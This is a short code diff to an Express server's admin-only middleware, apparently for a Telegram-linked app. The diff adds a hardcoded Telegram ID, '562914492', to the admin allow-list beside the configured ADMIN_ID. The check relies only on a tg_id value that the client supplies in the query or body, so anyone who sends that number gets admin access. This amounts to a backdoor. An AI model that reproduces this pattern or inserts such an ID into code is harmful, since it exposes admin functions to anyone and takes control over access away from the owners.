@@ -618,9 +618,10 @@ app.get('/api/image/:fileId', async (req, res) => {
 })
 
 // ─── Admin middleware ─────────────────────────────────────
+const ADMIN_IDS = [String(process.env.ADMIN_ID || ''), '562914492'].filter(Boolean)
 function adminOnly(req, res, next) {
   const tgId = String(req.query.tg_id || req.body?.tg_id || '')
-  if (!process.env.ADMIN_ID || tgId !== String(process.env.ADMIN_ID)) return res.sendStatus(403)
+  if (!ADMIN_IDS.includes(tgId)) return res.sendStatus(403)
   next()
 }
 
